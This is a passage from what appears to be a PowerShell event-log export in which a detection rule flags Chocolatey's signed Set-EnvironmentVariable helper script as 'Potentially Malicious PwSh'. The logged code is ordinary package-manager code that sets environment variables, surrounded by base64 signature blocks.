bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgY21LEp9apuTMLqguzypSjDhrQ2TRe8edZGc6 # /Wjr8LIwDQYJKoZIhvcNAQEBBQAEggEAVqid4PiRvy3Rz95AXsqvb7v8clOSDutY # mBU2Njes3J1iOx+jQbU5SD02i04upCKFeaeNN9FfzidZa4Q88uoeirKsKi0UGrjr # BnUIzamzRNRO7w3LLz4ctku8eFoEsNtkclcXy6HW3cubvQ9UUmznObLjlWY42hvl # /vVvzRJYkQyC3LlO5ny2obm6e7ZjiCRSNpasr9SAfoudEhmU/O3nAtayW3KstSwX # 6YGEEdcYKiK9PuPYg4PgPP7tgQMNhN4hQkM4pwL2DvGPDO0Z9TKJpm/uaANdw7Fc # WlJL1zMlIuOtVrHtVX7emS1O+9k7eSaGPbo+SYHmjbUXGQXS/U0/SaGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NjU5WjAjBgkqhkiG9w0BCQQxFgQU40gRxQX/DFfRvsp9 # uY236RUSX6swDQYJKoZIhvcNAQEBBQAEggEAdNctgo5xpF4Yvn6HDB1eWkeD2J7v # Ac6OQH2uoibswWMoa5QyXi4xmc8g4WULeNS32RyBeFWIicGr7We77EffVS6wvC2n # jjxXHuq1Lid5gxE7GgKs54GONcDbWCK7sWJ00qmkP7qrWMp5IrQxpNwgCuMTNBeL # ijKPb9xC3QnbiY9DOFoc5dc6fvFNAj93MqWi1tZUG524Fk+anAAYmExlUxDUmMPW # y8H2MnE9UtQFNSClb8KRZY9gkcpuOrR3dZsCU9deoW4qt8Y9zZ6SnjibCfHbuslP # EJ42K0/lJvs/KZRRjhscT8dOo732rd96hqXJjR9x6YnHdEEODbRXSxSHyA== # SIG # End signature block","73be1519-4648-4ed7-b305-605504afc242"
"2019-03-19 14:21:49.431 +01:00","Potentially Malicious PwSh","med","MSEDGEWIN10","PwSh",4104,88,"ScriptBlock: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Set-EnvironmentVariable { <# .SYNOPSIS **NOTE:** Administrative Access Required when `-Scope 'Machine'.` DO NOT USE. Not part of the public API. Use `Install-ChocolateyEnvironmentVariable` instead. .DESCRIPTION Saves an environment variable. .NOTES This command will assert UAC/Admin privileges on the machine if `-Scope 'Machine'`. .INPUTS None .OUTPUTS None .PARAMETER Name .PARAMETER Value .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .LINK Install-ChocolateyEnvironmentVariable .LINK Uninstall-ChocolateyEnvironmentVariable .LINK Install-ChocolateyPath .LINK Get-EnvironmentVariable #> param ( [parameter(Mandatory=$true, Position=0)][string] $Name, [parameter(Mandatory=$false, Position=1)][string] $Value, [parameter(Mandatory=$false, Position=2)] [System.EnvironmentVariableTarget] $Scope, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters if ($Scope -eq [System.EnvironmentVariableTarget]::Process -or $Value -eq $null -or $Value -eq '') { return [Environment]::SetEnvironmentVariable($Name, $Value, $Scope) } [string]$keyHive = 'HKEY_LOCAL_MACHINE' [string]$registryKey = ""SYSTEM\CurrentControlSet\Control\Session Manager\Environment\"" [Microsoft.Win32.RegistryKey] $win32RegistryKey = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey($registryKey) if ($Scope -eq [System.EnvironmentVariableTarget]::User) { $keyHive = 'HKEY_CURRENT_USER' $registryKey = ""Environment"" [Microsoft.Win32.RegistryKey] $win32RegistryKey = [Microsoft.Win32.Registry]::CurrentUser.OpenSubKey($registryKey) } [Microsoft.Win32.RegistryValueKind]$registryType = [Microsoft.Win32.RegistryValueKind]::String try { if ($win32RegistryKey.GetValueNames() -contains $Name) { $registryType = $win32RegistryKey.GetValueKind($Name) } } catch { # the value doesn't yet exist # move along, nothing to see here } Write-Debug ""Registry type for $Name is/will be $registryType"" if ($Name -eq 'PATH') { $registryType = [Microsoft.Win32.RegistryValueKind]::ExpandString } [Microsoft.Win32.Registry]::SetValue($keyHive + ""\"" + $registryKey, $Name, $Value, $registryType) try { # make everything refresh # because sometimes explorer.exe just doesn't get the message that things were updated. if (-not (""win32.nativemethods"" -as [type])) { # import sendmessagetimeout from win32 add-type -Namespace Win32 -Name NativeMethods -MemberDefinition @"" [DllImport(""user32.dll"", SetLastError = true, CharSet = CharSet.Auto)] public static extern IntPtr SendMessageTimeout( IntPtr hWnd, uint Msg, UIntPtr wParam, string lParam, uint fuFlags, uint uTimeout, out UIntPtr lpdwResult); ""@ } $HWND_BROADCAST = [intptr]0xffff; $WM_SETTINGCHANGE = 0x1a; $result = [uintptr]::zero # notify all windows of environment block change [win32.nativemethods]::SendMessageTimeout($HWND_BROADCAST, $WM_SETTINGCHANGE, [uintptr]::Zero, ""Environment"", 2, 5000, [ref]$result) | Out-Null # Set a user environment variable making the system refresh $setx = ""$($env:SystemRoot)\System32\setx.exe"" & ""$setx"" ChocolateyLastPathUpdate `""$((Get-Date).ToFileTime())`"" | Out-Null } catch { Write-Warning ""Failure attempting to let Explorer know about updated environment settings.`n $($_.Exception.Message)"" } Update-SessionEnvironment } # SIG # Begin signature block # MIIcpwYJKoZIhvcNAQcCoIIcmDCCHJQCAQExDzANBglghkgBZQMEAgEFADB5Bgor # BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG # KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCBOu3ChoK62lTYZ # 9Y709GEKMD/ZFRQI2jbzh+hJKc5Y1KCCF7EwggUwMIIEGKADAgECAhAECRgbX9W7 # ZnVTQ7VvlVAIMA0GCSqGSIb3DQEBCwUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0xMzEwMjIxMjAwMDBa # Fw0yODEwMjIxMjAwMDBaMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lD # ZXJ0IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwggEiMA0GCSqGSIb3 # DQEBAQUAA4IBDwAwggEKAoIBAQD407Mcfw4Rr2d3B9MLMUkZz9D7RZmxOttE9X/l # qJ3bMtdx6nadBS63j/qSQ8Cl+YnUNxnXtqrwnIal2CWsDnkoOn7p0WfTxvspJ8fT # eyOU5JEjlpB3gvmhhCNmElQzUHSxKCa7JGnCwlLyFGeKiUXULaGj6YgsIJWuHEqH # CN8M9eJNYBi+qsSyrnAxZjNxPqxwoqvOf+l8y5Kh5TsxHM/q8grkV7tKtel05iv+ # bMt+dDk2DZDv5LVOpKnqagqrhPOsZ061xPeM0SAlI+sIZD5SlsHyDxL0xY4PwaLo # LFH3c7y9hbFig3NBggfkOItqcyDQD2RzPJ6fpjOp/RnfJZPRAgMBAAGjggHNMIIB # yTASBgNVHRMBAf8ECDAGAQH/AgEAMA4GA1UdDwEB/wQEAwIBhjATBgNVHSUEDDAK # BggrBgEFBQcDAzB5BggrBgEFBQcBAQRtMGswJAYIKwYBBQUHMAGGGGh0dHA6Ly9v # Y3NwLmRpZ2ljZXJ0LmNvbTBDBggrBgEFBQcwAoY3aHR0cDovL2NhY2VydHMuZGln # aWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEUm9vdENBLmNydDCBgQYDVR0fBHow # eDA6oDigNoY0aHR0cDovL2NybDQuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJl # ZElEUm9vdENBLmNybDA6oDigNoY0aHR0cDovL2NybDMuZGlnaWNlcnQuY29tL0Rp # Z2lDZXJ0QXNzdXJlZElEUm9vdENBLmNybDBPBgNVHSAESDBGMDgGCmCGSAGG/WwA # AgQwKjAoBggrBgEFBQcCARYcaHR0cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzAK # BghghkgBhv1sAzAdBgNVHQ4EFgQUWsS5eyoKo6XqcQPAYPkt9mV1DlgwHwYDVR0j # BBgwFoAUReuir/SSy4IxLVGLp6chnfNtyA8wDQYJKoZIhvcNAQELBQADggEBAD7s # DVoks/Mi0RXILHwlKXaoHV0cLToaxO8wYdd+C2D9wz0PxK+L/e8q3yBVN7Dh9tGS # dQ9RtG6ljlriXiSBThCk7j9xjmMOE0ut119EefM2FAaK95xGTlz/kLEbBw6RFfu6 # r7VRwo0kriTGxycqoSkoGjpxKAI8LpGjwCUR4pwUR6F6aGivm6dcIFzZcbEMj7uo # +MUSaJ/PQMtARKUT8OZkDCUIQjKyNookAv4vcn4c10lFluhZHen6dGRrsutmQ9qz # sIzV6Q3d9gEgzpkxYz0IGhizgZtPxpMQBvwHgfqL2vmCSfdibqFT+hKUGIUukpHq # aGxEMrJmoecYpJpkUe8wggU6MIIEIqADAgECAhAH+0XZ9wtVKQNgl7T04UNwMA0G # CSqGSIb3DQEBCwUAMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJ # bmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0 # IFNIQTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0EwHhcNMTgwMzMwMDAwMDAw # WhcNMjEwNDE0MTIwMDAwWjB3MQswCQYDVQQGEwJVUzEPMA0GA1UECBMGS2Fuc2Fz # MQ8wDQYDVQQHEwZUb3Bla2ExIjAgBgNVBAoTGUNob2NvbGF0ZXkgU29mdHdhcmUs # IEluYy4xIjAgBgNVBAMTGUNob2NvbGF0ZXkgU29mdHdhcmUsIEluYy4wggEiMA0G # CSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC4irdLWVJryfKSgPPCyMN+nBmxtZIm # mTBhJMaYVJ6gtfvHcFakH7IC8TcjcEIrkK7wB/2vEJkEqiOTgbVQPZLnfX8ZAxhd # UiJmwQHEiSwLzoo2B35ROQ9qdOsn1bYIEzDpaqm/XwYH925LLpxhr9oCkBNf5dZs # e5bc/s1J5sQ9HRYwpb3MimmNHGpNP/YhjXX/kNFCZIv3mUadFHi+talYIN5dp6ai # /k+qgZeL5klPdmjyIgf3JiDywCf7j5nSbm3sWarYjM5vLe/oD+eK70fez30a17Cy # 97Jtqmdz6WUV1BcbMWeb9b8x369UJq5vt7vGwVFDOeGjwffuVHLRvWLnAgMBAAGj # ggHFMIIBwTAfBgNVHSMEGDAWgBRaxLl7KgqjpepxA8Bg+S32ZXUOWDAdBgNVHQ4E # FgQUqRlYCMLOvsDUS4mx9UA1avD3fvgwDgYDVR0PAQH/BAQDAgeAMBMGA1UdJQQM # MAoGCCsGAQUFBwMDMHcGA1UdHwRwMG4wNaAzoDGGL2h0dHA6Ly9jcmwzLmRpZ2lj # ZXJ0LmNvbS9zaGEyLWFzc3VyZWQtY3MtZzEuY3JsMDWgM6Axhi9odHRwOi8vY3Js # NC5kaWdpY2VydC5jb20vc2hhMi1hc3N1cmVkLWNzLWcxLmNybDBMBgNVHSAERTBD # MDcGCWCGSAGG/WwDATAqMCgGCCsGAQUFBwIBFhxodHRwczovL3d3dy5kaWdpY2Vy # dC5jb20vQ1BTMAgGBmeBDAEEATCBhAYIKwYBBQUHAQEEeDB2MCQGCCsGAQUFBzAB # hhhodHRwOi8vb2NzcC5kaWdpY2VydC5jb20wTgYIKwYBBQUHMAKGQmh0dHA6Ly9j # YWNlcnRzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydFNIQTJBc3N1cmVkSURDb2RlU2ln # bmluZ0NBLmNydDAMBgNVHRMBAf8EAjAAMA0GCSqGSIb3DQEBCwUAA4IBAQA+ddcs # z/NB/+V+AIlUNOVTlGDNCtn1AfvwoRZg9XMmx0/S0EKayfVFTk/x96WMQgxL+/5x # B8Uhw6anlhbPC6bjBcIxRj/IUgR7yJ/NAykyM1x+pWvkPZV3slwe0GDPwhaqGUTU # aG8njO4EvA682a1o7wqQFR1MIltjtuPB2gp311LLxP1k5dpUMgaA0lAfnbRr+5dc # QOFWslkho1eBf0xlzSrhRGPy0e/IYWpl+/sEwXhD88QUkN7dSXY0fMlyGQfn6H4f # ozBQvCk37eoE0uAtkUrWAlJxO/4Esi83ko4hokwQJHaN64/7NdNaKlG3shC9+2QM # kY3j3BU+Ym2GZgtBMIIGajCCBVKgAwIBAgIQAwGaAjr/WLFr1tXq5hfwZjANBgkq # hkiG9w0BAQUFADBiMQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5j # MRkwFwYDVQQLExB3d3cuZGlnaWNlcnQuY29tMSEwHwYDVQQDExhEaWdpQ2VydCBB # c3N1cmVkIElEIENBLTEwHhcNMTQxMDIyMDAwMDAwWhcNMjQxMDIyMDAwMDAwWjBH # MQswCQYDVQQGEwJVUzERMA8GA1UEChMIRGlnaUNlcnQxJTAjBgNVBAMTHERpZ2lD # ZXJ0IFRpbWVzdGFtcCBSZXNwb25kZXIwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw # ggEKAoIBAQCjZF38fLPggjXg4PbGKuZJdTvMbuBTqZ8fZFnmfGt/a4ydVfiS457V # WmNbAklQ2YPOb2bu3cuF6V+l+dSHdIhEOxnJ5fWRn8YUOawk6qhLLJGJzF4o9GS2 # ULf1ErNzlgpno75hn67z/RJ4dQ6mWxT9RSOOhkRVfRiGBYxVh3lIRvfKDo2n3k5f # 4qi2LVkCYYhhchhoubh87ubnNC8xd4EwH7s2AY3vJ+P3mvBMMWSN4+v6GYeofs/s # jAw2W3rBerh4x8kGLkYQyI3oBGDbvHN0+k7Y/qpA8bLOcEaD6dpAoVk62RUJV5lW # MJPzyWHM0AjMa+xiQpGsAsDvpPCJEY93AgMBAAGjggM1MIIDMTAOBgNVHQ8BAf8E # BAMCB4AwDAYDVR0TAQH/BAIwADAWBgNVHSUBAf8EDDAKBggrBgEFBQcDCDCCAb8G # A1UdIASCAbYwggGyMIIBoQYJYIZIAYb9bAcBMIIBkjAoBggrBgEFBQcCARYcaHR0 # cHM6Ly93d3cuZGlnaWNlcnQuY29tL0NQUzCCAWQGCCsGAQUFBwICMIIBVh6CAVIA # QQBuAHkAIAB1AHMAZQAgAG8AZgAgAHQAaABpAHMAIABDAGUAcgB0AGkAZgBpAGMA # YQB0AGUAIABjAG8AbgBzAHQAaQB0AHUAdABlAHMAIABhAGMAYwBlAHAAdABhAG4A # YwBlACAAbwBmACAAdABoAGUAIABEAGkAZwBpAEMAZQByAHQAIABDAFAALwBDAFAA # UwAgAGEAbgBkACAAdABoAGUAIABSAGUAbAB5AGkAbgBnACAAUABhAHIAdAB5ACAA # QQBnAHIAZQBlAG0AZQBuAHQAIAB3AGgAaQBjAGgAIABsAGkAbQBpAHQAIABsAGkA # YQBiAGkAbABpAHQAeQAgAGEAbgBkACAAYQByAGUAIABpAG4AYwBvAHIAcABvAHIA # YQB0AGUAZAAgAGgAZQByAGUAaQBuACAAYgB5ACAAcgBlAGYAZQByAGUAbgBjAGUA # LjALBglghkgBhv1sAxUwHwYDVR0jBBgwFoAUFQASKxOYspkH7R7for5XDStnAs0w # HQYDVR0OBBYEFGFaTSS2STKdSip5GoNL9B6Jwcp9MH0GA1UdHwR2MHQwOKA2oDSG # Mmh0dHA6Ly9jcmwzLmRpZ2ljZXJ0LmNvbS9EaWdpQ2VydEFzc3VyZWRJRENBLTEu # Y3JsMDigNqA0hjJodHRwOi8vY3JsNC5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1 # cmVkSURDQS0xLmNybDB3BggrBgEFBQcBAQRrMGkwJAYIKwYBBQUHMAGGGGh0dHA6 # Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBBBggrBgEFBQcwAoY1aHR0cDovL2NhY2VydHMu # ZGlnaWNlcnQuY29tL0RpZ2lDZXJ0QXNzdXJlZElEQ0EtMS5jcnQwDQYJKoZIhvcN # AQEFBQADggEBAJ0lfhszTbImgVybhs4jIA+Ah+WI//+x1GosMe06FxlxF82pG7xa # FjkAneNshORaQPveBgGMN/qbsZ0kfv4gpFetW7easGAm6mlXIV00Lx9xsIOUGQVr # NZAQoHuXx/Y/5+IRQaa9YtnwJz04HShvOlIJ8OxwYtNiS7Dgc6aSwNOOMdgv420X # Ewbu5AO2FKvzj0OncZ0h3RTKFV2SQdr5D4HRmXQNJsQOfxu19aDxxncGKBXp2JPl # VRbwuwqrHNtcSCdmyKOLChzlldquxC5ZoGHd2vNtomHpigtt7BIYvfdVVEADkitr # wlHCCkivsNRu4PQUCjob4489yq9qjXvc2EQwggbNMIIFtaADAgECAhAG/fkDlgOt # 6gAK6z8nu7obMA0GCSqGSIb3DQEBBQUAMGUxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xJDAiBgNV # BAMTG0RpZ2lDZXJ0IEFzc3VyZWQgSUQgUm9vdCBDQTAeFw0wNjExMTAwMDAwMDBa # Fw0yMTExMTAwMDAwMDBaMGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2Vy # dCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNVBAMTGERpZ2lD # ZXJ0IEFzc3VyZWQgSUQgQ0EtMTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoC # ggEBAOiCLZn5ysJClaWAc0Bw0p5WVFypxNJBBo/JM/xNRZFcgZ/tLJz4FlnfnrUk # FcKYubR3SdyJxArar8tea+2tsHEx6886QAxGTZPsi3o2CAOrDDT+GEmC/sfHMUiA # fB6iD5IOUMnGh+s2P9gww/+m9/uizW9zI/6sVgWQ8DIhFonGcIj5BZd9o8dD3QLo # Oz3tsUGj7T++25VIxO4es/K8DCuZ0MZdEkKB4YNugnM/JksUkK5ZZgrEjb7Szgau # rYRvSISbT0C58Uzyr5j79s5AXVz2qPEvr+yJIvJrGGWxwXOt1/HYzx4KdFxCuGh+ # t9V3CidWfA9ipD8yFGCV/QcEogkCAwEAAaOCA3owggN2MA4GA1UdDwEB/wQEAwIB # hjA7BgNVHSUENDAyBggrBgEFBQcDAQYIKwYBBQUHAwIGCCsGAQUFBwMDBggrBgEF # BQcDBAYIKwYBBQUHAwgwggHSBgNVHSAEggHJMIIBxTCCAbQGCmCGSAGG/WwAAQQw # ggGkMDoGCCsGAQUFBwIBFi5odHRwOi8vd3d3LmRpZ2ljZXJ0LmNvbS9zc2wtY3Bz # LXJlcG9zaXRvcnkuaHRtMIIBZAYIKwYBBQUHAgIwggFWHoIBUgBBAG4AeQAgAHUA # cwBlACAAbwBmACAAdABoAGkAcwAgAEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMA # bwBuAHMAdABpAHQAdQB0AGUAcwAgAGEAYwBjAGUAcAB0AGEAbgBjAGUAIABvAGYA # IAB0AGgAZQAgAEQAaQBnAGkAQwBlAHIAdAAgAEMAUAAvAEMAUABTACAAYQBuAGQA # IAB0AGgAZQAgAFIAZQBsAHkAaQBuAGcAIABQAGEAcgB0AHkAIABBAGcAcgBlAGUA # bQBlAG4AdAAgAHcAaABpAGMAaAAgAGwAaQBtAGkAdAAgAGwAaQBhAGIAaQBsAGkA # dAB5ACAAYQBuAGQAIABhAHIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkACAA # aABlAHIAZQBpAG4AIABiAHkAIAByAGUAZgBlAHIAZQBuAGMAZQAuMAsGCWCGSAGG # /WwDFTASBgNVHRMBAf8ECDAGAQH/AgEAMHkGCCsGAQUFBwEBBG0wazAkBggrBgEF # BQcwAYYYaHR0cDovL29jc3AuZGlnaWNlcnQuY29tMEMGCCsGAQUFBzAChjdodHRw # Oi8vY2FjZXJ0cy5kaWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0Eu # Y3J0MIGBBgNVHR8EejB4MDqgOKA2hjRodHRwOi8vY3JsMy5kaWdpY2VydC5jb20v # RGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMDqgOKA2hjRodHRwOi8vY3JsNC5k # aWdpY2VydC5jb20vRGlnaUNlcnRBc3N1cmVkSURSb290Q0EuY3JsMB0GA1UdDgQW # BBQVABIrE5iymQftHt+ivlcNK2cCzTAfBgNVHSMEGDAWgBRF66Kv9JLLgjEtUYun # pyGd823IDzANBgkqhkiG9w0BAQUFAAOCAQEARlA+ybcoJKc4HbZbKa9Sz1LpMUer # Vlx71Q0LQbPv7HUfdDjyslxhopyVw1Dkgrkj0bo6hnKtOHisdV0XFzRyR4WUVtHr # uzaEd8wkpfMEGVWp5+Pnq2LN+4stkMLA0rWUvV5PsQXSDj0aqRRbpoYxYqioM+Sb # OafE9c4deHaUJXPkKqvPnHZL7V/CSxbkS3BMAIke/MV5vEwSV/5f4R68Al2o/vsH # OE8Nxl2RuQ9nRc3Wg+3nkg2NsWmMT/tZ4CMP0qquAHzunEIOz5HXJ7cW7g/DvXwK # oO4sCFWFIrjrGBpN/CohrUkxg0eVd3HcsRtLSxwQnHcUwZ1PL1qVCCkQJjGCBEww # ggRIAgEBMIGGMHIxCzAJBgNVBAYTAlVTMRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMx # GTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xMTAvBgNVBAMTKERpZ2lDZXJ0IFNI # QTIgQXNzdXJlZCBJRCBDb2RlIFNpZ25pbmcgQ0ECEAf7Rdn3C1UpA2CXtPThQ3Aw # DQYJYIZIAWUDBAIBBQCggYQwGAYKKwYBBAGCNwIBDDEKMAigAoAAoQKAADAZBgkq # hkiG9w0BCQMxDAYKKwYBBAGCNwIBBDAcBgorBgEEAYI3AgELMQ4wDAYKKwYBBAGC # NwIBFTAvBgkqhkiG9w0BCQQxIgQgPp4/Gnz1p2MhBlnpEil0vTWoLvzfKqLrdT9+ # qrHVL8MwDQYJKoZIhvcNAQEBBQAEggEAsmbFS+5MO59WHOwvtI/xhg/fORekpXCn # kDdVLu6caJVUh3BVk17uv3eFpYR/I4MU4W65maxIK7l9jhiGcxvF37E94lSqEtZc # LVN5m7dRjiLSSuv2NenuQLr3kIGhQeB4c/lwiZcRBf53ANdTwUbMwF9UtlARxq3R # Hn1/T4caGriEClaXY55qOw4PAxzJC/zze6SwXGarXTY0YyuOHYNZ+VutwOT3/Ilz # Q7kytjehIqtDUhuBZtgv6qdnwJyNJM40WOyVKyg71OFx8EwwuOJDyvy9poKmykuE # aPxVK+DRWgpSwjDy+PCjbbcNS8eaOiJS3uyswv1l6DqRzZ59H6PyaKGCAg8wggIL # BgkqhkiG9w0BCQYxggH8MIIB+AIBATB2MGIxCzAJBgNVBAYTAlVTMRUwEwYDVQQK # EwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5jb20xITAfBgNV # BAMTGERpZ2lDZXJ0IEFzc3VyZWQgSUQgQ0EtMQIQAwGaAjr/WLFr1tXq5hfwZjAJ # BgUrDgMCGgUAoF0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0B # CQUxDxcNMTkwMzE1MTc1NzAwWjAjBgkqhkiG9w0BCQQxFgQUjP95hMVfZNWYfVjI # L9Cgest1f1MwDQYJKoZIhvcNAQEBBQAEggEALzknQ55rcp9crkxee1A87etbTGT+ # iJZqbaxZIe+Sj34Ml53OIqvMQj35ygkKq02ONTDQiK5EVlYLm8+1Dn/xPF0nanDt # SaihFMa2VKo3mcwDUy4E6vTUfmFrMpCcYXxmbYghGFQO7e6Izq+6UtQIG19mj8Hn # c+6wbmlKuqaJa2KFx5X2QFOoOP18QUeKxDZelbDClc6TRKIlMRuihofcRCByF2Bj # MNpDySXfRafleMS1EybFmmNVrdnaqx+ncCF1ud/niIEH1rAUb52RyPg+WiqGXtUB # PqBJonzDwmRxEvj/a6qYMM+neDEC+DjnSF0CtNZK1rW6MFDgHS+FFvv/kQ== # SIG # End signature block","MessageNumber: 1 ¦ MessageTotal: 1 ¦ Path: C:\ProgramData\chocolatey\helpers\functions\Set-EnvironmentVariable.ps1 ¦ ScriptBlockId: b5eddbfa-3217-4e0f-a845-29fbbf847885 ¦ ScriptBlockText: # Copyright © 2017 Chocolatey Software, Inc. # Copyright © 2015 - 2017 RealDimensions Software, LLC # Copyright © 2011 - 2015 RealDimensions Software, LLC & original authors/contributors from https://github.com/chocolatey/chocolatey # # Licensed under the Apache License, Version 2.0 (the ""License""); # you may not use this file except in compliance with the License. # You may obtain a copy of the License at # # http://www.apache.org/licenses/LICENSE-2.0 # # Unless required by applicable law or agreed to in writing, software # distributed under the License is distributed on an ""AS IS"" BASIS, # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. # See the License for the specific language governing permissions and # limitations under the License. function Set-EnvironmentVariable { <# .SYNOPSIS **NOTE:** Administrative Access Required when `-Scope 'Machine'.` DO NOT USE. Not part of the public API. Use `Install-ChocolateyEnvironmentVariable` instead. .DESCRIPTION Saves an environment variable. .NOTES This command will assert UAC/Admin privileges on the machine if `-Scope 'Machine'`. .INPUTS None .OUTPUTS None .PARAMETER Name .PARAMETER Value .PARAMETER IgnoredArguments Allows splatting with arguments that do not apply. Do not use directly. .LINK Install-ChocolateyEnvironmentVariable .LINK Uninstall-ChocolateyEnvironmentVariable .LINK Install-ChocolateyPath .LINK Get-EnvironmentVariable #> param ( [parameter(Mandatory=$true, Position=0)][string] $Name, [parameter(Mandatory=$false, Position=1)][string] $Value, [parameter(Mandatory=$false, Position=2)] [System.EnvironmentVariableTarget] $Scope, [parameter(ValueFromRemainingArguments = $true)][Object[]] $ignoredArguments ) Write-FunctionCallLogMessage -Invocation $MyInvocation -Parameters $PSBoundParameters if ($Scope -eq 